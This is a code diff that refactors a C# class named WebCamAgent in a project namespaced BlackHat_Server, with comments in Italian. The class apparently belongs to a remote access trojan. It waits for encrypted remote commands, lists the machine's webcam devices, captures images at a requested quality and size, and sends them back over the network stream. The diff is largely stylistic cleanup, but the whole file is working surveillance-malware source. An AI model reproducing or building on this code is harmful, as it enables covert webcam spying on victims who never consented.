@@ -1,33 +1,10 @@
-﻿using System;
-using System.Collections.Generic;
-using System.Drawing;
-using System.Net.Sockets;
-using System.Text;
+﻿using System.Net.Sockets;
 using System.Threading;
 
 namespace BlackHat_Server
 {
-    class WebCamAgent
+    internal class WebCamAgent
     {
-
-        #region MEMBERS
-
-        NetworkStream webcamStream;
-
-        // AGENTI DI COMUNICAZIONE
-        MsgFileManager mfm;
-        MsgManager mm;
-        CapCam cc;
-
-
-        bool isDeviceConnect = false;
-
-        bool stopWebCamListener = false;
-  
-        #endregion
-
-      
-
         public WebCamAgent(NetworkStream _ns)
         {
             webcamStream = _ns;
@@ -35,15 +12,14 @@ namespace BlackHat_Server
             mfm = new MsgFileManager(webcamStream);
             mm = new MsgManager(webcamStream);
             cc = new CapCam();
-            
         }
 
         /// <summary>
-        /// Avvia thread di ascolto per WebCam Capture
+        ///     Avvia thread di ascolto per WebCam Capture
         /// </summary>
         public void StartWebCamListener()
         {
-            Thread t = new Thread(WebCamListener);
+            var t = new Thread(WebCamListener);
             t.IsBackground = true;
             t.SetApartmentState(ApartmentState.STA);
             t.Start();
@@ -51,120 +27,112 @@ namespace BlackHat_Server
 
 
         /// <summary>
-        /// Listener per  WebCam
+        ///     Listener per  WebCam
         /// </summary>
         private void WebCamListener()
         {
-
             while (ST_Client.Instance.isConnected && !stopWebCamListener)
+            {
+                Thread.Sleep(10);
+
+                var cmd = mm.WaitForEncryMessageRicorsive(10000);
+
+                if (stopWebCamListener)
+                    break;
+
+                if (cmd != "TIMEOUT" && cmd != "__ERROR__")
                 {
-                    try
+                    var cmdSplit = cmd.Split('|');
+
+                    switch (cmdSplit[0])
                     {
-                        System.Threading.Thread.Sleep(10);
-
-                        string cmd = mm.WaitForEncryMessageRicorsive(10000);
-
-                        if (stopWebCamListener)
+                        case "WC_DEVICES":
+                            // INVIA LISTA DEI DEVICE WEBCAM
+                            SendDevices();
                             break;
 
-                        if (cmd != "TIMEOUT" && cmd != "__ERROR__")
-                        {
-                            string[] cmdSplit = cmd.Split('|');
+                        case "CAPTURE_WC":
+                            // CAPTURE_WC|NUMERO DRIVER|QUALITA|DIMENSIONIx|DIMENSIONIy
+                            SendCapture(int.Parse(cmdSplit[1]), int.Parse(cmdSplit[2]), int.Parse(cmdSplit[3]),
+                                int.Parse(cmdSplit[4]));
+                            break;
 
-                            switch (cmdSplit[0])
-                            {
-                                case "WC_DEVICES":
-                                    // INVIA LISTA DEI DEVICE WEBCAM
-                                    SendDevices();
-                                    break;
-
-                                case "CAPTURE_WC":
-                                    // CAPTURE_WC|NUMERO DRIVER|QUALITA|DIMENSIONIx|DIMENSIONIy
-                                    SendCapture(int.Parse(cmdSplit[1]), int.Parse(cmdSplit[2]), int.Parse(cmdSplit[3]), int.Parse(cmdSplit[4]));
-                                    break;
-
-                                case "DISCONNECT_WC":
-                                    Disconnect();
-                                    break;
-
-                                
-
-                                default:
-                                    break;
-                            }
-
-
-
-                        }
+                        case "DISCONNECT_WC":
+                            Disconnect();
+                            break;
                     }
-                    catch (Exception)
-                    {
-                        
-                        throw;
-                    }
-                  
                 }
+            }
 
-                // ARRIVO QUI PERCHè IL LISTENER è MORTO
-            
-                if (ST_Client.Instance.nsListaCanali.Contains(webcamStream))
-                    ST_Client.Instance.nsListaCanali.Remove(webcamStream);             
-                       
-           
+            // ARRIVO QUI PERCHè IL LISTENER è MORTO
+
+            if (ST_Client.Instance.nsListaCanali.Contains(webcamStream))
+                ST_Client.Instance.nsListaCanali.Remove(webcamStream);
+
+
             try
             {
                 webcamStream.Close();
             }
-            catch 
-            {                    
-                    
+            catch
+            {
             }
-                
-            
         }
         //---------------------------------
 
 
-
-
         /// <summary>
-        /// Invio la lista dei devices
+        ///     Invio la lista dei devices
         /// </summary>
         private void SendDevices()
         {
-            List<string> drivers = cc.GetWCDrivers();
+            var drivers = cc.GetWCDrivers();
 
-            bool sent = false;
+            var sent = false;
 
             if (drivers.Count == 0)
+            {
                 sent = mm.SendEncryMessage("NO_WC_DRIVERS", 10000);
+            }
             else
             {
-                string message = "";
-                foreach (var driver in drivers)                
+                var message = "";
+                foreach (var driver in drivers)
                     message += driver + "|";
 
                 message = message.TrimEnd('|');
 
-                sent = mm.SendEncryMessage(message,10000);
-
+                sent = mm.SendEncryMessage(message, 10000);
             }
 
             // SE NON RIESCO A MANDARE IL MESSAGGIO CHIUDO IL CANALE
             stopWebCamListener = !sent;
-
         }
+
+        #region MEMBERS
+
+        private readonly NetworkStream webcamStream;
+
+        // AGENTI DI COMUNICAZIONE
+        private readonly MsgFileManager mfm;
+        private readonly MsgManager mm;
+        private readonly CapCam cc;
+
+
+        private bool isDeviceConnect;
+
+        private bool stopWebCamListener;
+
+        #endregion
+
         //--------------------------------
-
-
 
 
         #region METODI
 
-
         /// <summary>
-        /// Se non sono connesso al device mi connetto ed invio un 
-        /// byte[] cryptato con l'immagine catturata
+        ///     Se non sono connesso al device mi connetto ed invio un
+        ///     byte[] cryptato con l'immagine catturata
         /// </summary>
         /// <param name="deviceNumber"></param>
         private void SendCapture(int deviceNumber, int quality, int xSize, int ySize)
@@ -175,27 +143,25 @@ namespace BlackHat_Server
 
             if (isDeviceConnect) // RICONTROLLO IN CASO DI TENTATA CONNESSIONE
             {
-                byte[] capturedJPG = cc.Capture(quality,xSize, ySize);
+                var capturedJPG = cc.Capture(quality, xSize, ySize);
 
                 if (capturedJPG != null)
                 {
-                    bool sent = mfm.SendEncryFileByte(capturedJPG, 10000);
+                    var sent = mfm.SendEncryFileByte(capturedJPG, 10000);
                 }
-
             }
             else
             {
                 // impossibile connettersi al device
 
-                mm.SendEncryMessage("NO_CONNECTION",5000);
+                mm.SendEncryMessage("NO_CONNECTION", 5000);
             }
-
         }
         //---------------------------------
 
 
         /// <summary>
-        /// Connette al device
+        ///     Connette al device
         /// </summary>
         /// <param name="device"></param>
         /// <returns></returns>
@@ -206,8 +172,8 @@ namespace BlackHat_Server
         //---------------------------------
 
         /// <summary>
-        /// Disconnette dal device attualmente usato
-        /// DEVI ESSEERE CONNESSO AD UN DEVICE!
+        ///     Disconnette dal device attualmente usato
+        ///     DEVI ESSEERE CONNESSO AD UN DEVICE!
         /// </summary>
         private void Disconnect()
         {
@@ -218,15 +184,6 @@ namespace BlackHat_Server
             stopWebCamListener = false; // CHIUDE ANCHE IL THREAD DI ASCOLTO
         }
 
-        
         #endregion
-
-
-
-      
-
-
-      
-
     }
 }
